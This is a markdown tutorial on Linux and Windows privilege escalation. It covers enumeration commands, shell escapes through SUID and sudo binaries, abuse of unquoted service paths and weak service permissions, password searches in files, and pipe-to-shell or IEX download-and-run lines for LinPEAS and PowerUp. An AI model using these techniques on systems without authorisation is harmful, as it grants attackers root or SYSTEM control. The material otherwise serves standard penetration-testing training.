# Privilege Escalation Tutorial: From Low Priv to Root

This tutorial assumes you already have a low-privilege shell on a target system. You know how to run basic commands. Now you need to get root (or SYSTEM).

> ⚠️ **Legal Disclaimer**  
> This tutorial is for educational purposes. Only practice on systems you own or have written permission to test.

---

## 📖 Table of Contents

1. [What is Privilege Escalation?](#1-what-is-privilege-escalation)
2. [Linux Privesc: Enumeration First](#2-linux-privesc-enumeration-first)
3. [Linux Privesc: SUID Binary Exploit](#3-linux-privesc-suid-binary-exploit)
4. [Linux Privesc: Sudo Misconfiguration](#4-linux-privesc-sudo-misconfiguration)
5. [Windows Privesc: Enumeration First](#5-windows-privesc-enumeration-first)
6. [Windows Privesc: Unquoted Service Path](#6-windows-privesc-unquoted-service-path)
7. [Windows Privesc: Weak Service Permissions](#7-windows-privesc-weak-service-permissions)
8. [Running Automated Enumeration Scripts](#8-running-automated-enumeration-scripts)
9. [Next Steps](#9-next-steps)

---

## 1. What is Privilege Escalation?

You have a shell as a low-privileged user. You can run some commands. But you can't read `/etc/shadow`. You can't install software. You can't move laterally.

**Privilege escalation is the process of moving from that low-priv user to a higher-privileged user (usually root on Linux, SYSTEM on Windows).**

Think of it like this: You're in the lobby of a building. You need to get to the penthouse. The doors are locked. You need to find a key — a vulnerability, misconfiguration, or weak permission — that lets you climb higher.

For a complete command reference, see [README.md](README.md). For a one-page cheat sheet, see [QUICKREF.md](QUICKREF.md).

---

## 2. Linux Privesc: Enumeration First

You can't exploit what you don't know. Enumeration means gathering information about the system. Run these commands as soon as you get a shell.

**Copy-paste these commands one by one:**

```bash
whoami
id
uname -a
cat /etc/os-release
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
```

- **What each command tells you:**

|Command	|What It Reveals|
|-----|-----|
|`whoami`|	Which user you are|
|`id`|	Your user ID, group ID, and group memberships|
|`uname -a`|	Kernel version (for exploits)|
|`cat /etc/os-release`|	Distribution and version|
|`sudo -l`|	What commands you can run as root|
|`find / -perm -4000`|	SUID binaries (possible privilege escalation)|
|`cat /etc/crontab`|	Scheduled tasks (possible command injection)|
|`ls -la /etc/cron*`|	More cron jobs|

- **Example output (from a vulnerable machine):**

```bash
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo -l
Matching Defaults entries for www-data on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/find

```

- That `sudo -l` output shows that `www-data` can run `find` as root with no password. That's a vulnerability.


## 3. Linux Privesc: SUID Binary Exploit

- SUID (Set User ID) binaries run with the file owner's privileges. If an SUID binary is owned by root, it runs as root.

- **Find SUID binaries:**
```bah
find / -perm -4000 -type f 2>/dev/null
```
- **Common SUID binaries that can be exploited:**

|Binary| Exploit Command|
|-----|-----|
|`find`| |`find / -exec /bin/sh \; -quit`|
|`bash`| `bash -p`|
|`less / more`| Run binary, then `!sh`|
|`vim`| `vim -c ':!/bin/sh'`|
|`nano`| `nano`, then `^R^X`, then `reset; sh 1>&0 2>&0`|
|`awk` |`awk 'BEGIN {system("/bin/sh")}'`|
|`perl`| `perl -e 'exec "/bin/sh";'`|
|`python` |`python -c 'import pty;pty.spawn("/bin/sh")'`|

- **Example: Exploit find SUID**

```bash
/usr/bin/find / -exec /bin/sh \; -quit
```

- If find has SUID set and is owned by root, this gives you a root shell:

```bash
# whoami
root
```

---

## 4. Linux Privesc: Sudo Misconfiguration

- Check what commands you can run with sudo:

```bash
sudo -l
```

- **Common sudo misconfigurations and how to exploit them:**

|`sudo -l` Entry| Exploit Command|
|-----|-----|
|`(ALL) NOPASSWD: ALL`| `sudo su or sudo -i`|
|`(ALL) NOPASSWD: /bin/bash `|`sudo /bin/bash`|
|`(ALL) NOPASSWD: /usr/bin/vim `|`sudo vim -c '!sh'`|
|`(ALL) NOPASSWD: /usr/bin/less `|`sudo less,` then `!sh`|
|`(ALL) NOPASSWD: /usr/bin/awk`| `sudo awk 'BEGIN {system("/bin/sh")}'`|
|`(ALL) NOPASSWD: /usr/bin/python* `|`sudo python -c 'import pty;pty.spawn("/bin/sh")'`|

- **Example: Exploit `sudo vim`**

```bash
sudo vim -c '!sh'
```

- This opens vim as root and then executes a shell:

```bash
# whoami
root
```

---

## 5. Windows Privesc: Enumeration First

- You have a Windows shell. You're a low-priv user. You need SYSTEM.

- **Copy-paste these commands one by one (in a CMD shell):**

```cmd
whoami
whoami /priv
whoami /groups
net user
net localgroup Administrators
systeminfo
sc query
wmic service get name,displayname,pathname,startname
schtasks /query /fo LIST /v
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
findstr /si password *.txt *.ini *.config
```

- **What each command tells you:**

|Command| What It Reveals|
|----|-----|
|`whoami`| Which user you are|
|`whoami /priv`| Your privileges (SeImpersonate, SeBackup, etc.)|
|`whoami /groups `|Your group memberships|
|`net user`| All local users|
|`net localgroup Administrators`| Who is in the Administrators group|
|`systeminfo`| OS version, patches, hotfixes|
|`sc query`| Running services|
|`wmic service `|Service paths and start accounts|
|`schtasks /query`| Scheduled tasks|
|`reg query`| Registry startup entries|
|`findstr /si password`| Search for passwords in files|

---

## 6. Windows Privesc: Unquoted Service Path

- When a service path contains spaces and is NOT enclosed in quotes, Windows tries to execute each part of the path.

- **Example vulnerable path:**

```
C:\Program Files\My Service\service.exe
```

- If you can write to C:\Program.exe, Windows will execute YOUR program instead of the service.

- **Check for unquoted service paths:**

```cmd
wmic service get name,pathname | findstr /i /v "C:\\Windows\\" | findstr /i "\" "
```

- **If you find a vulnerable service:**

  - 1. Check if you can write to the directory where the service looks for executables
  - 2. Place your malicious executable there
  - 3. Restart the service (or wait for a reboot)

- **Example: Check write permissions**

```cmd
dir "C:\Program Files\My Service\"
```

- If you can write to that directory (or a parent directory like C:\Program Files\), you can place a malicious executable named Program.exe or My.exe or Service.exe depending on the path.

---

## 7. Windows Privesc: Weak Service Permissions

- If a service is configured with weak permissions, you can change its binary path to execute anything.

- **Check service permissions with `accesschk.exe` (download from Microsoft Sysinternals):**

```cmd
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "BUILTIN\Users" *
accesschk.exe -uwcqv "Everyone" *
```

- **If you have `SERVICE_CHANGE_CONFIG` permission on a service running as SYSTEM:**

```cmd
sc config SERVICE_NAME binPath= "C:\path\to\malicious.exe"
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

- Your malicious program runs as SYSTEM.

- **Example: Using PowerShell to find weak service permissions**

```powershell
Get-CimInstance Win32_Service | ForEach-Object {
    $name = $_.Name
    $sd = $_.GetSecurityDescriptor().Descriptor
    if ($sd.DACL -like "*Everyone*") {
        Write-Host "Weak service found: $name"
    }
}
```

---

## 8. Running Automated Enumeration Scripts

- Manual enumeration is powerful but slow. Use scripts to automate the process.

- **Linux (LinPEAS):**

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

- **Windows (WinPEAS):**

```cmd
powershell -exec bypass -c "Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.exe -OutFile winPEAS.exe; ./winPEAS.exe"
```

- **Windows (PowerUp):**

```powershell
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

- These scripts do in seconds what would take you hours.

---

## 9. Next Steps

- You now know the basics of privilege escalation. To go further:

  - Practice on TryHackMe (Privilege Escalation rooms)
  - Practice on HackTheBox (Easy/Medium boxes)
  - Read the [README.md](README.md) for the complete command reference
  - Use the [QUICKREF.md](QUICKREF.md0) as a daily cheat sheet
  - Read the [GUIDE.md](GUIDE.md) for strategy and detection

Remember: Privilege escalation is a skill. You won't get it right away. Practice on intentionally vulnerable machines. Learn from failures. Eventually, you'll see the patterns.






























































